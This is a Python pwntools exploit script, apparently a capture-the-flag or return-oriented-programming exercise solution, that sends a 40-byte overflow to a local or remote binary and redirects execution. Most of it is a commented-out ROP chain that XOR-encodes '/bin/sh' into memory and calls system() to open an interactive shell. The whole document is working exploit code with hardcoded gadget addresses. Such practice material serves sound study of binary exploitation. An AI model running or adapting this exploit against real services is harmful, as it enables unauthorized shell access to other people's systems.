import sys
import logging
from pwn import *

logging.basicConfig(level=logging.INFO, format="%(message)s")
#logging.disable(logging.CRITICAL)


if len(sys.argv) == 2:
    program_name = sys.argv[1]
    target = process(program_name)
    logging.info("***local exploit ***")
    
else:
    HOST = sys.argv[1]
    PORT = int(sys.argv[2])
    logging.info("***remote exploit ***")
    logging.info("[*]target host : " + HOST)
    logging.info("[*]target port : " + str(PORT))
    target = remote(HOST, PORT)

    ###address###
system_plt = 0x4006f0
xor_r15_r14b = 0x0000000000400b30
mov_r13_r12 = 0x0000000000400b34
pop_r12_r13 = 0x0000000000400b3b
pop_r14_r15 = 0x0000000000400b40
pop_rdi = 0x0000000000400b39

bss_addr = 0x601080
useful_func = 0x4009df

def bytes_xor(bytes_1):
    return bytes([_a ^ 0xff for _a in bytes_1])
    
    ###main###
def main():
    ###payload###
    payload = b"A" * 40
    payload += p64(useful_func)
    # payload += p64(pop_r12_r13)
    # payload += bytes_xor(b"/bin/sh\x00")
    # payload += p64(bss_addr + 0x200)
    # payload += p64(mov_r13_r12)
    
    # payload += p64(pop_r14_r15)
    # payload += p64(0xff)
    # payload += p64(bss_addr + 0x200)
    # payload += p64(xor_r15_r14b)

    # payload += p64(pop_r14_r15)
    # payload += p64(0xff)
    # payload += p64(bss_addr + 0x201)
    # payload += p64(xor_r15_r14b)

    # payload += p64(pop_r14_r15)
    # payload += p64(0xff)
    # payload += p64(bss_addr + 0x202)
    # payload += p64(xor_r15_r14b)

    # payload += p64(pop_r14_r15)
    # payload += p64(0xff)
    # payload += p64(bss_addr + 0x203)
    # payload += p64(xor_r15_r14b)

    # payload += p64(pop_r14_r15)
    # payload += p64(0xff)
    # payload += p64(bss_addr + 0x204)
    # payload += p64(xor_r15_r14b)

    # payload += p64(pop_r14_r15)
    # payload += p64(0xff)
    # payload += p64(bss_addr + 0x205)
    # payload += p64(xor_r15_r14b)

    # payload += p64(pop_r14_r15)
    # payload += p64(0xff)
    # payload += p64(bss_addr + 0x206)
    # payload += p64(xor_r15_r14b)

    # payload += p64(pop_r14_r15)
    # payload += p64(0xff)
    # payload += p64(bss_addr + 0x207)
    # payload += p64(xor_r15_r14b)

    # payload += p64(pop_rdi)
    # payload += p64(bss_addr + 0x200)
    # payload += p64(system_plt)
    # payload += b"BBBBBBBB"
    
    
    _ = target.recvuntil("> ")
    print(_)
    target.sendline(payload)
    ret = target.recvuntil("")
    
        
    target.interactive()

if __name__ == "__main__":
    main()
